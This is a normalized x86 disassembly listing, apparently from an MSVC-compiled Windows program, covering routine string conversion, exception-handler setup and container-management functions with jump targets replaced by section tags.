mov [ eax + 0x4 ] dx
mov [ esp + 0x1c ] ecx
cmp esi ecx
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x8
mov eax [ esp + 0x28 ]
mov ebx [ MultiByteToWideChar@IAT ]
push ecx
push ecx
push 0xffffffff
push esi
push ecx
push eax
call ebx
mov ebp eax
xor ecx ecx
lea eax [ ebp + 0x1 ]
mov edx 0x2
mul edx
seto cl
push rw-data
neg ecx
or ecx eax
push ecx
call sub_440cc4
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov eax [ esp + 0x24 ]
lea eax [ ebp + ebp + 0x2 ]
push eax
push 0x0
push edi
call sub_443360
mov ecx [ esp + 0x34 ]
add esp 0xc
push ebp
push edi
push 0xffffffff
push esi
push 0x0
push ecx
call ebx
mov eax edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov esi [ esp + 0x24 ]
sub eax edx
sar eax 0x1
push eax
mov eax edi
call sub_429cc0
push edi
call sub_43f97a
add esp 0x4
mov eax esi
jmp r-xdata
sub_40ed90
push ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi ]
push eax
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
call sub_43f960
add esp 0x8
retn
mov ecx [ esp ]
push edi
mov edi [ esi + 0x10 ]
push ecx
call sub_412b30
mov edx [ esi + 0xc ]
push edx
call sub_43f960
add esp 0x8
pop edi
sub_40ede0
sub esp 0xc
push ebp
mov ebp [ ebx + 0xc ]
push esi
push edi
test ebp ebp
jne r-xdata
mov ecx [ ebx + 0x14 ]
sub ecx ebp
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
cmp ebp edi
jbe r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x10 ]
push ecx
push edx
push eax
push edi
mov ecx 0x1
call sub_412790
add esp 0x10
add edi 0x1c
mov [ ebx + 0x10 ] edi
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx ebp
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax esi
jae r-xdata
mov eax [ ebx ]
mov ecx [ esp + 0x1c ]
push edi
push eax
push ecx
lea edx [ esp + 0x1c ]
push edx
mov eax ebx
call sub_40f900
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
call sub_4407b7
sub_40ee80
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x8
push ebx
mov ebx [ edi + 0xc ]
push esi
test ebx ebx
jne r-xdata
mov ecx [ edi + 0x14 ]
sub ecx ebx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
xor ecx ecx
jmp r-xdata
cmp ebx esi
jbe r-xdata
mov [ esp + 0x8 ] 0x0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push esi
mov edx 0x1
call sub_412890
add esp 0xc
add esi 0xc0
mov [ edi + 0x10 ] esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ edi + 0x10 ]
mov edx esi
sub edx ebx
mov eax 0x2aaaaaab
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ecx
jae r-xdata
mov eax [ edi ]
push esi
push eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
mov eax edi
call sub_40fdf0
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4407b7
sub_40ef20
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov [ esp + 0x10 ] eax
cmp [ edi + 0xc ] eax
jbe r-xdata
mov esi [ edi + 0xc ]
mov ebx [ edi ]
cmp esi [ edi + 0x10 ]
jbe r-xdata
call sub_4407b7
mov ecx [ esp + 0x10 ]
mov eax [ edi ]
push ecx
push ebx
push esi
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_40fec0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4407b7
sub_40ef70
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_45a390
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp eax edx
je r-xdata
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ edx ]
mov ecx [ eax ]
mov [ eax ] esi
mov [ edx ] ecx
mov esi [ eax ]
cmp esi ecx
je r-xdata
lea ecx [ edx + 0xc ]
lea esi [ eax + 0xc ]
cmp esi ecx
je r-xdata
mov ebx [ ecx ]
mov edi [ esi ]
mov [ esi ] ebx
mov [ ecx ] edi
lea ecx [ edx + 0x10 ]
lea esi [ eax + 0x10 ]
cmp esi ecx
je r-xdata
mov ebx [ ecx ]
mov edi [ esi ]
mov [ esi ] ebx
mov [ ecx ] edi
lea ecx [ edx + 0x14 ]
add eax 0x14
cmp eax ecx
je r-xdata
mov ebx [ ecx ]
mov edi [ esi ]
mov [ esi ] ebx
mov [ ecx ] edi
mov esi [ ecx ]
mov edx [ eax ]
mov [ eax ] esi
mov [ ecx ] edx
sub_40f040
push ecx
push esi
mov esi eax
mov eax [ esp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
pop esi
pop ecx
retn 0x4
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov [ esp + 0x4 ] eax
add eax 0x4
mov [ esp + 0x4 ] eax
mov eax [ eax ]
jmp r-xdata
mov eax ebx
push 0x0
sub eax ecx
mov ebx esi
call sub_421af0
or eax 0xffffffff
call sub_429980
jmp r-xdata
push ebx
push ebp
mov ebp [ MultiByteToWideChar@IAT ]
push edi
push 0x0
push 0x0
push 0xffffffff
push eax
push 0x0
push 0xfde9
call ebp
mov ecx [ esi + 0x14 ]
mov edi eax
lea ebx [ edi - 0x1 ]
cmp ebx ecx
ja r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_43f111
cmp [ esi + 0x14 ] 0x0
ja r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
mov eax [ ecx ]
jmp r-xdata
mov eax [ esp + 0x18 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
dec edi
push edi
push esi
push 0xffffffff
push eax
push 0x0
push 0xfde9
call ebp
pop edi
pop ebp
pop ebx
sub_40f0f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_45a356
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x18 ] eax
mov edi ecx
mov eax r--data
mov [ esp + 0x14 ] edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov eax 0xfffffffe
mov eax r--data
xor ebx ebx
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
xor eax eax
call sub_4105c0
mov esi eax
cmp esi 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea ecx [ ecx ]
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x80 ]
xor ecx esp
call sub_43f96b
mov esp ebp
pop ebp
retn 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x60 ]
call sub_42a180
add esi [ esp + 0x6c ]
cmp [ esp + 0x70 ] 0x10
jb r-xdata
mov eax r--data
inc ebx
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov ecx [ esp + 0x5c ]
push ecx
call sub_43f960
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
mov eax esi
call sub_4105c0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax r--data
mov [ esp + 0x70 ] 0xf
mov [ esp + 0x6c ] 0x0
mov [ esp + 0x5c ] 0x0
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
test ebx ebx
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
xor eax eax
call sub_4105c0
test eax eax
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov edi edi
push eax
xor ecx ecx
lea esi [ esp + 0x5c ]
mov edx edi
call sub_40f8d0
push eax
lea esi [ esp + 0x20 ]
mov [ esp + 0xa4 ] 0x0
call sub_40f010
mov ebx [ esp + 0x18 ]
mov edx esi
push edx
mov [ esp + 0xa4 ] 0x1
call sub_40f670
call sub_412bc0
lea ecx [ esp + 0x58 ]
mov [ esp + 0xa0 ] 0xffffffff
call sub_429da0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
xor eax eax
call sub_4105c0
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
mov eax r--data
mov [ esp + 0x70 ] 0xf
mov [ esp + 0x6c ] 0x0
mov [ esp + 0x5c ] 0x0
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x60 ]
call sub_42a180
add edi [ esp + 0x6c ]
cmp [ esp + 0x70 ] 0x10
jb r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax [ esp + 0x5c ]
push eax
call sub_43f960
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ esp + 0x14 ]
sub eax edx
push eax
push ebx
mov eax edi
call sub_4105c0
mov ecx edi
mov edx ebx
cmp eax 0xffffffff
jne r-xdata
sub eax edi
push eax
lea esi [ esp + 0x40 ]
call sub_40f8d0
push 0xffffffff
mov [ esp + 0xa4 ] 0x5
push 0x0
mov esi 0xf
push eax
lea ecx [ esp + 0x80 ]
mov [ esp + 0x98 ] esi
mov [ esp + 0x94 ] 0x0
mov [ esp + 0x84 ] 0x0
call sub_429ea0
mov [ esp + 0xa0 ] 0x7
cmp [ esp + 0x54 ] 0x10
jb r-xdata
push eax
lea esi [ esp + 0x20 ]
call sub_40f8d0
push 0xffffffff
mov [ esp + 0xa4 ] 0x2
push 0x0
mov esi 0xf
push eax
lea ecx [ esp + 0x64 ]
mov [ esp + 0x7c ] esi
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x68 ] 0x0
call sub_429ea0
mov [ esp + 0xa0 ] 0x4
cmp [ esp + 0x34 ] 0x10
jb r-xdata
cmp [ esp + 0x88 ] 0x0
mov [ esp + 0x54 ] esi
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x40 ] 0x0
je r-xdata
mov ecx [ esp + 0x40 ]
push ecx
call sub_43f960
add esp 0x4
cmp [ esp + 0x6c ] 0x0
mov [ esp + 0x34 ] esi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
je r-xdata
mov ecx [ esp + 0x20 ]
push ecx
call sub_43f960
add esp 0x4
mov [ esp + 0xa0 ] 0xffffffff
cmp [ esp + 0x8c ] 0x10
jb r-xdata
mov ebx [ esp + 0x18 ]
lea edx [ esp + 0x74 ]
push edx
call sub_40f670
mov ebx [ esp + 0x14 ]
mov esi 0xf
mov [ esp + 0xa0 ] 0xffffffff
cmp [ esp + 0x70 ] 0x10
jb r-xdata
mov ebx [ esp + 0x18 ]
lea edx [ esp + 0x58 ]
push edx
call sub_40f670
mov ebx [ esp + 0x14 ]
mov [ esp + 0x8c ] esi
mov [ esp + 0x88 ] 0x0
mov [ esp + 0x78 ] 0x0
mov eax [ esp + 0x78 ]
push eax
call sub_43f960
add esp 0x4
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax [ esp + 0x5c ]
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
mov eax edi
call sub_4105c0
mov edi eax
cmp edi 0xffffffff
jne r-xdata
sub_40f4f0
push 0xffffffff
push sub_45a938
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
push 0x4
call sub_43fa1d
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] ecx
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_40f550
push ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ esi ]
push ecx
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
call sub_43f960
add esp 0x8
retn
mov ecx [ esp ]
mov edx [ esi + 0x10 ]
push ecx
push edx
push eax
call sub_412a80
mov eax [ esi + 0xc ]
push eax
call sub_43f960
add esp 0x10
sub_40f5a0
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov eax edi
imul eax eax 0xd8
add eax [ esi + 0xc ]
retn
call sub_4407b7
sub_40f5d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x8
push ebx
mov ebx [ edi + 0xc ]
push esi
test ebx ebx
jne r-xdata
mov ecx [ edi + 0x14 ]
sub ecx ebx
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
xor ecx ecx
jmp r-xdata
cmp ebx esi
jbe r-xdata
mov [ esp + 0x8 ] 0x0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push esi
mov edx 0x1
call sub_412930
add esp 0xc
add esi 0xd8
mov [ edi + 0x10 ] esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ edi + 0x10 ]
mov edx esi
sub edx ebx
mov eax 0x4bda12f7
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ecx
jae r-xdata
mov eax [ edi ]
push esi
push eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
mov eax edi
call sub_410030
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4407b7
sub_40f670
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebx + 0xc ]
sub esp 0x8
push esi
push edi
test eax eax
jne r-xdata
mov ecx [ ebx + 0x14 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
cmp [ ebx + 0xc ] edi
jbe r-xdata
mov [ esp + 0x8 ] 0x0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push edi
mov edx 0x1
call sub_4129f0
add esp 0xc
add edi 0x1c
mov [ ebx + 0x10 ] edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebx + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax esi
jae r-xdata
mov eax [ ebx ]
push edi
push eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
mov eax ebx
call sub_410130
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
call sub_4407b7
sub_40f720
push 0xffffffff
push sub_459ce8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
push 0x4
call sub_43fa1d
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] ecx
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_40f780
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi ]
push eax
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
call sub_43f960
pop ecx
retn
push eax
call sub_43f960
add esp 0x4
sub_40f7b0
push ebp
mov ebp esp
and esp 0xfffffff8
mov ecx [ edi + 0xc ]
sub esp 0xc
push esi
test ecx ecx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
cmp ecx esi
jbe r-xdata
mov eax [ ebx ]
mov [ esi ] eax
add esi 0x4
mov [ edi + 0x10 ] esi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ edi + 0x10 ]
mov edx esi
sub edx ecx
sar edx 0x2
cmp edx eax
jae r-xdata
mov eax [ edi ]
push esi
push eax
push ebx
lea ecx [ esp + 0x14 ]
push ecx
mov eax edi
call sub_410240
pop esi
mov esp ebp
pop ebp
retn
call sub_4407b7
sub_40f810
mov ecx [ ebx + 0x18 ]
mov eax [ ecx + 0x4 ]
sub esp 0x14
cmp [ eax + 0x15 ] 0x0
push ebp
push esi
push edi
mov edi ecx
jne r-xdata
mov esi [ ebx ]
mov ebp [ ebx + 0x18 ]
test esi esi
je r-xdata
mov ecx [ esp + 0x24 ]
mov ecx [ ecx ]
lea ebx [ ebx ]
call sub_4407b7
cmp esi esi
je r-xdata
mov edi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ ecx ]
push edi
push esi
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
mov eax ebx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] 0x0
call sub_410320
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov edx [ esp + 0x24 ]
mov eax [ edx ]
cmp eax [ edi + 0xc ]
jae r-xdata
cmp edi ebp
je r-xdata
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov esi [ esi ]
jmp r-xdata
call sub_4407b7
test esi esi
jne r-xdata
cmp edi [ esi + 0x18 ]
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebp
add esp 0x14
retn 0x4
call sub_4407b7
sub_40f8d0
push ecx
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xf
mov [ esp ] eax
mov [ esi + 0x4 ] al
mov eax [ esp + 0x8 ]
push eax
push ecx
push edx
mov ecx esi
call sub_429ea0
mov eax esi
pop ecx
retn 0x4
sub_40f900
sub esp 0xc
push ebx
push ebp
push esi
mov esi eax
mov ebx [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
mov ecx ebx
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
cmp edi ebx
jbe r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esi ]
test ecx ecx
je r-xdata
call sub_4407b7
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push ecx
push edx
push eax
mov ecx esi
call sub_4106e0
mov ebx [ esi + 0xc ]
cmp ebx [ esi + 0x10 ]
jbe r-xdata
call sub_4407b7
cmp ecx eax
je r-xdata
mov esi [ esi ]
mov ebp esi
mov [ esp + 0x18 ] ebx
test esi esi
jne r-xdata
call sub_4407b7
mov ecx [ esp + 0x2c ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
mov eax [ esi ]
jmp r-xdata
call sub_4407b7
xor eax eax
lea ecx [ edi * 8 ]
sub ecx edi
lea edi [ ebx + ecx * 4 ]
cmp edi [ eax + 0x10 ]
ja r-xdata
call sub_4407b7
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x20 ]
mov [ eax + 0x4 ] edi
pop edi
pop esi
mov [ eax ] ebp
pop ebp
pop ebx
add esp 0xc
retn 0x10
cmp edi [ esi + 0xc ]
jae r-xdata
sub_40f9e0
push ecx
mov [ esp ] 0x0
mov eax [ esp ]
mov ecx [ esp ]
push eax
push ecx
push edx
push edi
mov ecx esi
call sub_412790
lea eax [ esi * 8 ]
sub eax esi
lea eax [ edi + eax * 4 ]
add esp 0x14
retn
sub_40fa10
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x18 ]
mov esi [ edi + 0x1c ]
add esi eax
cmp eax esi
jbe r-xdata
mov edi [ edi ]
mov ebx edi
mov [ esp + 0x14 ] esi
test edi edi
jne r-xdata
call sub_4407b7
mov eax [ edi ]
mov ecx eax
jmp r-xdata
call sub_4407b7
xor eax eax
xor ecx ecx
mov ecx [ ecx + 0x1c ]
add ecx [ eax + 0x18 ]
dec esi
cmp esi ecx
ja r-xdata
call sub_4407b7
test edi edi
je r-xdata
xor edi edi
mov edi [ edi ]
jmp r-xdata
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] esi
call sub_412220
pop edi
pop esi
pop ebx
add esp 0x10
retn
cmp esi [ edi + 0x18 ]
jae r-xdata
sub_40fa80
push ecx
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
mov ecx [ ebx + 0x18 ]
add ecx eax
push esi
push edi
test cl 0x3
jne r-xdata
mov edi [ ebx + 0x18 ]
add edi [ ebx + 0x1c ]
mov eax [ ebx + 0x14 ]
mov esi edi
shr esi 0x2
cmp eax esi
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ ebx + 0x14 ] eax
ja r-xdata
mov edx [ ebx + 0x10 ]
cmp [ edx + esi * 4 ] 0x0
jne r-xdata
sub esi eax
call sub_410a40
mov edx [ ebx + 0x10 ]
mov eax [ edx + esi * 4 ]
and edi 0x3
lea eax [ eax + edi * 4 ]
test eax eax
je r-xdata
push 0x10
call sub_43fa1d
mov ecx [ ebx + 0x10 ]
add esp 0x4
mov [ ecx + esi * 4 ] eax
inc [ ebx + 0x1c ]
pop edi
pop esi
pop ebx
pop ecx
retn 0x4
mov ecx [ esp + 0x14 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_40fb00
push ebx
xor ebx ebx
cmp [ esi + 0x1c ] ebx
je r-xdata
push edi
mov edi [ esi + 0x14 ]
cmp edi ebx
jbe r-xdata
mov eax [ esi + 0x1c ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x10 ]
pop edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0x10 ]
dec edi
cmp [ eax + edi * 4 ] ebx
lea eax [ eax + edi * 4 ]
je r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
dec eax
mov [ esi + 0x1c ] eax
cmp eax ebx
jne r-xdata
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
pop ebx
retn
push eax
call sub_43f960
add esp 0x4
cmp edi ebx
ja r-xdata
mov ecx [ eax ]
push ecx
call sub_43f960
add esp 0x4
mov [ esi + 0x18 ] ebx
sub_40fb60
push ebp
mov ebp esp
push 0xffffffff
push sub_459ff8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi [ ebp + 0x8 ]
push 0x4
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x1555555
jbe r-xdata
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov edi edx
mov eax 0x0
shr edi 0x1f
add edi edx
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
je r-xdata
mov ecx edi
call sub_410f70
lea ecx [ edi + edi * 2 ]
shl ecx 0x6
add ecx eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x18 ] eax
cmp [ ebx + 0xc ] eax
jbe r-xdata
call sub_411920
mov edi [ ebx + 0xc ]
cmp edi [ ebx + 0x10 ]
jbe r-xdata
call sub_4407b7
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x14 ]
push edx
mov edx [ ebp - 0x18 ]
push ecx
push eax
push edx
mov ecx edi
call sub_412c20
add esp 0x10
mov [ esi + 0x10 ] eax
call sub_4407b7
sub_40fc70
push ecx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
cmp ebp ebx
je r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ecx
retn 0x4
mov eax [ ebx + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov edi edx
shr edi 0x1f
add edi edx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
sub edx ecx
mov eax 0x2aaaaaab
imul edx
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
cmp edi esi
ja r-xdata
mov eax ebp
call sub_40ef20
mov eax ebp
pop edi
pop esi
pop ebp
pop ecx
retn 0x4
test ecx ecx
jne r-xdata
mov [ esp + 0x14 ] 0x0
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x14 ]
push eax
mov eax [ esp + 0x18 ]
push edx
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax ecx
mov ecx [ ebx + 0xc ]
call sub_412830
mov edi [ ebp + 0x10 ]
add esp 0x10
mov esi eax
cmp eax edi
je r-xdata
mov edx [ ebp + 0x14 ]
sub edx ecx
mov eax 0x2aaaaaab
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
xor eax eax
jmp r-xdata
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
lea ecx [ eax + eax * 2 ]
shl ecx 0x6
add ecx [ ebp + 0xc ]
mov eax ebp
mov [ ebp + 0x10 ] ecx
pop edi
pop esi
pop ebp
pop ecx
retn 0x4
call sub_402480
add esi 0xc0
cmp esi edi
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebx + 0xc ]
lea esi [ esi + esi * 2 ]
shl esi 0x6
push ecx
add esi eax
push esi
push eax
call sub_4124a0
mov edx [ ebx + 0x10 ]
add esp 0xc
push edx
mov edx [ ebp + 0x10 ]
push esi
call sub_412570
mov [ ebp + 0x10 ] eax
mov eax ebp
pop edi
pop esi
pop ebp
pop ecx
retn 0x4
cmp edi eax
ja r-xdata
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov esi edx
mov eax 0x0
shr esi 0x1f
add esi edx
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] eax
mov [ ebp + 0x14 ] eax
je r-xdata
mov edi [ ebp + 0x10 ]
mov eax ecx
call sub_410ba0
mov eax [ ebp + 0xc ]
push eax
call sub_43f960
add esp 0x4
mov edi ebp
call sub_40ff80
test al al
je r-xdata
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0xc ]
push ecx
push edx
mov edx [ ebp + 0xc ]
call sub_412570
mov [ ebp + 0x10 ] eax
sub_40fdf0
sub esp 0xc
push ebx
push ebp
push esi
mov esi eax
mov ebx [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
mov ecx ebx
sub ecx edi
